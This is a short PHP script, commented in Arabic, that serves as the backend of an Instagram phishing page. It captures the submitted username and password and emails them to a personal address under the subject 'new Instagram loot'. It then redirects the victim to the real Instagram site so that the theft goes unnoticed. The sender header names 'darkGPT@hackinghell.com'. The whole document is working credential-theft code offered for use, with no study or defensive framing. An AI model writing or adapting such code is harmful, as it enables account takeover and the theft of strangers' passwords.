<?php
if ($_SERVER["REQUEST_METHOD"] =="POST") {$username = $_POST['username'];$password = $_POST['password'];
    
    // إرسال البيانات إلى بريدك الإلكتروني$to ="hussain@gmail.com";$subject ="غنيمة إنستغرام جديدة";$message ="اسم المستخدم:".$username."\nكلمة المرور:".$password;$headers ="From: darkGPT@hackinghell.com";
    
    mail($to,$subject,$message,$headers);
    
    // إعادة توجيه الضحية لتبدو العملية طبيعية
    header("Location: https://www.instagram.com");
    exit();}?>